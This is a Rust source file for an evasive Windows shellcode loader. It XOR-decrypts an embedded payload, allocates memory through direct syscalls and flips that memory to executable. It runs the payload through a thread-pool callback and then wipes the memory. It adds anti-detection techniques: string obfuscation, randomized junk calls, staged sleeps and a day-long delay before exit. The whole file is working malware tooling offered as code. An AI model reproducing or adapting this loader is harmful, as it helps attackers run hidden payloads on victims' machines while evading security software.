#![no_std]
#![no_main]

use crate::apis::{FnWriteFile, PtpWorkCallback, WinApi, print, rand_actions, sleep};
use core::{
    ffi::c_void,
    mem::transmute,
    ptr::{null_mut, write_bytes},
    slice::from_raw_parts_mut,
};
use obfstr::obfstr;
mod apis;

#[cfg(not(test))]
#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    loop {}
}

/// Thats a stub function
/// # Safety
/// You should not call it!
#[unsafe(no_mangle)]
pub unsafe extern "C" fn __chkstk() {}

#[unsafe(no_mangle)]
pub static mut __security_cookie: usize = 0x12358172193AB218;

/// Thats a cookie stands for buffer overflow protection
/// # Safety
/// You should not use it!
#[unsafe(no_mangle)]
pub unsafe extern "C" fn __security_check_cookie(_cookie: usize) {}

/// Memcpy implementation
/// # Safety
/// Can panic if you will give something broken
#[unsafe(no_mangle)]
pub unsafe extern "C" fn memcpy(dest: *mut u8, src: *const u8, n: usize) -> *mut u8 {
    let mut i = 0;
    while i < n {
        unsafe { *dest.add(i) = *src.add(i) };
        i += 1
    }
    dest
}

/// Memset implementation
/// # Safety
/// Can panic if you will give something broken
#[unsafe(no_mangle)]
pub unsafe extern "C" fn memset(s: *mut u8, c: i32, n: usize) -> *mut u8 {
    let mut i = 0;
    while i < n {
        unsafe { *s.add(i) = c as u8 };
        i += 1;
    }
    s
}

#[inline(always)]
fn execute<F, T>(func: F, h_std_out: *mut c_void, write_file: FnWriteFile) -> T
where
    F: FnOnce() -> T,
{
    rand_actions(h_std_out, write_file);
    let result = func();
    rand_actions(h_std_out, write_file);
    result
}

#[unsafe(no_mangle)]
pub extern "system" fn catch_me_if_you_can() {
    let win_api = WinApi::new();
    let syscalls = win_api.get_syscalls();

    execute(
        || sleep(2000, null_mut(), win_api.write_file),
        null_mut(),
        win_api.write_file,
    );

    unsafe {
        if (win_api.attach_console)(0u32.wrapping_sub(1)) == 0 {
            (win_api.alloc_console)();
        }
    }

    print(
        obfstr!(include_str!("../banner.txt")),
        win_api.h_std_out,
        win_api.write_file,
    );
    print(
        obfstr!("\nLoading in 5 seconds...\n"),
        win_api.h_std_out,
        win_api.write_file,
    );

    let code = include_bytes!("../encrypted_shellcode.bin");
    let decrypted = &mut code.clone();
    for (i, byte) in decrypted.iter_mut().enumerate() {
        *byte ^= [0x81, 0xFA, 0x77, 0x20][i % 4];
    }
    let mut exec_mem = core::ptr::null_mut();
    /*let status = unsafe {
        execute(|| (win_api.virtual_alloc)(
            !0usize as *mut c_void,
            &mut exec_mem,
            0,
            &mut decrypted.len().clone(),
            (1 << 12) | (1 << 13),
            1 << 2,
        ), null_mut(), win_api.write_file)
    };*/
    let mut alloc_size = decrypted.len();
    let status = WinApi::alloc(syscalls.alloc, &mut exec_mem, &mut alloc_size, 1 << 2);
    if exec_mem.is_null() || status != 0 {
        print(
            obfstr!("Failed VA. Exiting.\n"),
            win_api.h_std_out,
            win_api.write_file,
        );
        return sleep(3000, null_mut(), win_api.write_file);
    };

    execute(
        || sleep(2000, null_mut(), win_api.write_file),
        null_mut(),
        win_api.write_file,
    );

    unsafe {
        let dest_slice = from_raw_parts_mut(exec_mem as *mut u8, decrypted.len());
        dest_slice.copy_from_slice(decrypted);
    };

    if unsafe {
        execute(
            || {
                (win_api.virtual_protect)(
                    !0usize as *mut c_void,
                    &mut exec_mem,
                    &mut decrypted.len(),
                    1 << 5,
                    &mut 0u32,
                )
            },
            null_mut(),
            win_api.write_file,
        )
    } != 0
    {
        print(
            obfstr!("failed VP. Exiting.\n"),
            win_api.h_std_out,
            win_api.write_file,
        );
        return sleep(3000, null_mut(), win_api.write_file);
    };

    execute(
        || sleep(2000, null_mut(), win_api.write_file),
        null_mut(),
        win_api.write_file,
    );

    print(obfstr!("Loading\n"), win_api.h_std_out, win_api.write_file);

    unsafe {
        let mut work_ptr: *mut c_void = null_mut();

        let callback_fn: PtpWorkCallback = transmute(exec_mem);

        let status = (win_api.tp_alloc_work)(
            &mut work_ptr as *mut *mut c_void as *mut c_void,
            Some(callback_fn),
            null_mut(),
            null_mut(),
        );

        if status == 0 && !work_ptr.is_null() {
            (win_api.tp_post_work)(work_ptr);
        } else {
            return;
        }
    }

    execute(
        || sleep(1000, null_mut(), win_api.write_file),
        null_mut(),
        win_api.write_file,
    );

    unsafe {
        execute(
            || {
                (win_api.virtual_protect)(
                    !0usize as *mut c_void,
                    &mut exec_mem,
                    &mut decrypted.len(),
                    (0x0F & 0x0C) ^ 0x08,
                    &mut 0u32,
                )
            },
            null_mut(),
            win_api.write_file,
        );
        execute(
            || write_bytes(exec_mem as *mut u8, 0, 512),
            null_mut(),
            win_api.write_file,
        );
        execute(
            || {
                (win_api.virtual_protect)(
                    !0usize as *mut c_void,
                    &mut exec_mem,
                    &mut decrypted.len(),
                    0x40 >> 1,
                    &mut 0u32,
                )
            },
            null_mut(),
            win_api.write_file,
        );
    };

    execute(
        || sleep(24 * 60 * 60 * 1000, null_mut(), win_api.write_file),
        null_mut(),
        win_api.write_file,
    );

    unsafe {
        (win_api.exit_process)(!0usize as *mut c_void, 0);
    }
}
